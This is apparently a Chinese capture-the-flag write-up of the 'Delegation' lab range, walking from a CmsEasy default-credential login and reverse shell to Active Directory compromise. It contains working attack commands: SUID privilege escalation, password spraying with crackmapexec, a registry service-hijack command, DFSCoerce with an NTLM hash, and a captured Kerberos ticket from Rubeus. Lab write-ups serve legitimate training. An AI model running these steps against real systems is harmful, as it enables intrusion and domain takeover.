---
layout: post
title: 春秋云镜——Delegation
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Delegation/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[13:12:33] [INFO] Start IpScan:39.99.230.60
[13:12:33] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[13:12:33] [+] 39.99.230.60:110 open
[13:12:33] [+] 39.99.230.60:25 open
[13:12:35] [+] 39.99.230.60:80 open
[13:12:44] [+] [TCP/HTTP] [200] [Apache/2.4.41 (Ubuntu)][PHP][CmsEasy][Apache-Struts2][Apache-HTTP-Server/2.4.41][JEECG-VUE3版][Apache-Web-Server][jQuery] http://39.99.230.60:80 [中文网页标题]
[13:12:48] [+] 39.99.230.60:3306 open
[13:12:49] [+] [TCP/MYSQL]  [MySQL 8.0.29-0ubuntu0.20.04.3] 39.99.230.60:3306 [[.8.0.29-0ubuntu0.20.04.3.aD[ yD".L'dUV+ fTF9.cach]
[13:12:49] [INFO] start MYSQL check 39.99.230.60:3306
[13:12:49] [+] 开始 MysqlScan 任务: MYSQL://39.99.230.60:3306


┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                             
[2025-04-10 13:12:56] [INFO] 暴力破解线程数: 1                               
[2025-04-10 13:12:56] [INFO] 开始信息扫描
[2025-04-10 13:12:56] [INFO] 最终有效主机数量: 1
[2025-04-10 13:12:56] [INFO] 开始主机扫描
[2025-04-10 13:12:56] [INFO] 有效端口数量: 233
[2025-04-10 13:12:56] [SUCCESS] 端口开放 39.99.230.60:110
[2025-04-10 13:12:56] [SUCCESS] 端口开放 39.99.230.60:22
[2025-04-10 13:12:56] [SUCCESS] 端口开放 39.99.230.60:21
[2025-04-10 13:12:56] [SUCCESS] 端口开放 39.99.230.60:80
[2025-04-10 13:12:56] [SUCCESS] 服务识别 39.99.230.60:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]                               
[2025-04-10 13:12:56] [SUCCESS] 服务识别 39.99.230.60:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]                           
[2025-04-10 13:12:57] [SUCCESS] 端口开放 39.99.230.60:3306
[2025-04-10 13:12:57] [SUCCESS] 服务识别 39.99.230.60:3306 => [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3.-K' *LH2.& h.ybD@3\.caching_sha2_password]                                             
[2025-04-10 13:13:02] [SUCCESS] 服务识别 39.99.230.60:80 => [http]
[2025-04-10 13:13:05] [SUCCESS] 服务识别 39.99.230.60:110 => 
[2025-04-10 13:13:07] [INFO] 存活端口数量: 5
[2025-04-10 13:13:07] [INFO] 开始漏洞扫描
[2025-04-10 13:13:07] [INFO] 加载的插件: ftp, mysql, pop3, ssh, webpoc, webtitle                                                                          
[2025-04-10 13:13:08] [SUCCESS] 网站标题 http://39.99.230.60       状态码:200 长度:68104  标题:中文网页标题
```

---

# 0x02 preference代码rce

访问80端口的`cmseasy`服务，后台`admin:123456`直接登陆进去了。我们查看是否有能让我们反弹shell的地方。经典的编辑模板RCE，在展示的html文件处塞入反弹shell指令即可。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Delegation/02.png?raw=true)

拿到shell后我们尝试找第一个flag。发现第一个flag上了权限要提权。find一下找到了

```bash
www-data@localhost:~/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
```

diff提权，详见gtfobins

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Delegation/03.png?raw=true)

---

# 0x02 内网信息收集

拿到第一个flag后，我们上frp+fscan内网大保健。

```bash
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.4.36     is alive
(icmp) Target 172.22.4.7      is alive
(icmp) Target 172.22.4.19     is alive
(icmp) Target 172.22.4.45     is alive
[*] Icmp alive hosts len is: 4
172.22.4.36:3306 open
172.22.4.45:445 open
172.22.4.19:445 open
172.22.4.7:445 open
172.22.4.45:139 open
172.22.4.19:139 open
172.22.4.7:139 open
172.22.4.45:135 open
172.22.4.19:135 open
172.22.4.7:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.7:88 open
[*] alive ports len is: 15
start vulscan
[*] NetInfo
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetInfo
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetBios 172.22.4.45     XIAORANG\WIN19
[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
[*] WebTitle http://172.22.4.36        code:200 len:68031  title:中文网页标题
[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
```

按提示，我们可以尝试对域内的Adrian用户做一下密码爆破。毕竟是只给账户+rockyou，很难不联想。

```bash
┌──(root㉿kali)-[/home/kali]
└─# proxychains4 -q crackmapexec smb 172.22.4.45 -d WIN19 -u Adrian -p /usr/share/wordlists/rockyou.txt
SMB         172.22.4.45     445    WIN19            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19) (domain:WIN19) (signing:False) (SMBv1:False)
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED
```

爆出了其密码，但是显示已经过期了。不打紧，我们rdesktop登陆上去改个密码就行。登陆上去后有一个`PrivescCheck`文件夹，进去查看html是已经检测好的可用于提权的检测报告。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Delegation/04.png?raw=true)

---

# 0x03 windows注册表劫持提权

检测到可用于劫持的注册表项，我们查询windows注册表劫持提权手法，并按此复现

- [windows-提权常用技巧总结_注册表提权-CSDN博客](https://blog.csdn.net/weixin_54217950/article/details/123244394#:~:text=本文详细介绍了Windows系统中的提权技术，包括利用Watson检查系统漏洞、使用wes和windows-exploit-suggester扫描工具、未使用双引号的服务路径提权、弱服务权限利用、弱注册表权限提权、弱文件夹权限提权和DLL劫持等方法。,通过这些步骤，可以获取系统的更高权限。 如果该系统经常升级，那么这些利用方式可能不会那么有效。)

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\gupdate /v ImagePath /t REG_EXPAND_SZ /d  C:\Users\Public\18447.exe /f
```

但请注意，`gupdate`指向的后门文件存活期很短，我们需要尽快做好进程迁移，或者短期内创建一个新的恶意用户来维持权限。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Delegation/05.png?raw=true)

在拿到此flag后，我们尝试使用`system`权限与域内通信，并使用BloodHound获取域内的结构数据。并使用`ADfind`查找域内约束委派关系。

```cmd
C:\Users\gailo\Desktop>AdFind.exe -b "DC=xiaorang,DC=lab" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName                                                                         AdFind V01.47.00cpp Joe Richards (joe@joeware.net) October 2012                           Using server: DC01.xiaorang.lab:389                                                 Directory: Windows Server 2012                                                           dn:CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab                   
>cn: DC01                                                                                 >distinguishedName: CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab                     dn:CN=WIN19,CN=Computers,DC=xiaorang,DC=lab                           
>cn: WIN19                                                                               >distinguishedName: CN=WIN19,CN=Computers,DC=xiaorang,DC=lab                             2 Objects returned
```

---

# 0x04 强制认证攻击

可以查到DC01与WIN19有约束委派关系，但是传统的约束委派手法不是很起作用，我们需要用到NTLM中继攻击中的`DFScoerce`进行申请与监听。

```bash
┌──(root㉿kali)-[/home/kali/ichunqiu]
└─# proxychains4 -q python3 dfscoerce.py -u 'WIN19$' -hashes :5943c35371c96f19bda7b8e67d041727 -d xiaorang.lab 172.22.4.45 172.22.4.7


C:\Users\newuser\Desktop>Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 1 seconds for new TGTs


[*] 2025/3/1 14:41:56 UTC - Found new TGT:

  User                  :  DC01$@XIAORANG.LAB
  StartTime             :  2025/3/1 20:23:36
  EndTime               :  2025/3/2 6:23:36
  RenewTill             :  2025/3/8 20:23:36
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5XXMnOJ1bCBROicESaQn7OQXQMu0VZSgvKiJWLSd97v4HXDKZOoFzMeFV1L5jaZO27pu+nx1i5a7GiNeOl8DFatXVW0NPFwgUqCEMA2km08X9dVBrtqI6RNF1VtxVxIQO+qqJnMCY22ZRkfkKvak+6fS7djedFAEC6geBqzUr8t/lIvDmUsS9QGrORqbJEiUNlj9X/TNg3r+3DpbTVobH3F0FLKoIjOb7uz+WZ/cCsZc4S6I/sjbDzvRH0CUmyGjzsgvUSIBT/Z9kICDU2oP1xNTMaHfTi2OwOenwJkX9iFp5aTEkcKktpa7xi+SaoWiNXjhuo9lQXeriB/RHccQq03Pcp+nvF2sABhUOQQD8E54IeevOsGGlvTz4k639t7ft2ICG3YrM84G2qy37DBARqbaBSFdWWZWxlUs3GYliEFjklQipSkLpGSHo31kirYzbRtgTceohvWEdnAylR0RO+wXQeZSRvc64vCmGRP9Mjddz4nBTEPoiImc1U/Y7LAtxcVO5FJM1UuUZyFVOlSIeSalEuWXYWZfZxFvAZqKkkbQju12ezlfJkTMryCv6qB/1/zhzL3HY4trgN3sssM9FdnxedNTGzVOB1WHRZSseWOQhvSoiJwrfqqoDNdZEwlsTwLSlz6fqNzysSp8rF48jajy0U/7pScfjc4w18BDUSQntoDup3nzMfxF+fY1aLi34PQ+EN9EotWZyEgnmBcanbALOeq94pcnxm6Gn983BiDSvtwtxHYtjA4/sAnu6lDP/58GnH79Iin0T9beMGqVV9nFt+zeJtCskLpOVvEHG+xU20jfRhwRFthNoefpxb7ZXRf5IBEs4WA7/9lrb4usrV9/Xu+q3EeNW+Z//3VDNCThd8zdoJ7WXQccj29afR+kghaztpx28fOY9udqqR+t+7PMIb4k/AtMyxtwUIOlyJXSzS1/sGp1QP2dMcK+NrY0+RFm3BATekYyyW7Rf1LlevlzPM9R79jw1ftPdx7YJ4N2hF2KZ26s0gBFOKIymdMhXZ4ye62xNjHRaZbysaBYy4hRpNOWg54niiIqge/IDjjFXF2PW/9rNsDd2Dx/dB5rNgwBYJMFuZb87qHkkENwzYvQ+yguKdPe/fpECdDvAOBYMcope/pxOezI5r7hiHWherfYunnRe32g0etD2RpTQADSB0wkQuA+38/g95hqGjpRvWvPNWW+cyOT1xws9tuTuCalvPCO5Atznj6eQGhPDt9lMeYyQMFcX0TSAW3zp3ujgJd+uKWLUIRZdyFdzpRCorS4EsHcEurmPytlzz8k++TpGyJmvegPyqe+w0fuoSU7y/mC7CkAxlG/CQG3hMoiyiOZPKHbKc95dAFhWxAHfgcpSD2QbVdsnOkq/He1GwlrHtYDRYgc9Jph4Ttny2SfPIPr/AQBqCVrfka3QMh7z4Wo3ZqdHo3im3CRdkmUijgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCC7ge9rON+/hlml51K1mzdPCRJRN4w+31vAvak6Q3S2lqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDMwMTEyMjMzNlqmERgPMjAyNTAzMDEyMjIzMzZapxEYDzIwMjUwMzA4MTIyMzM2WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
```
---
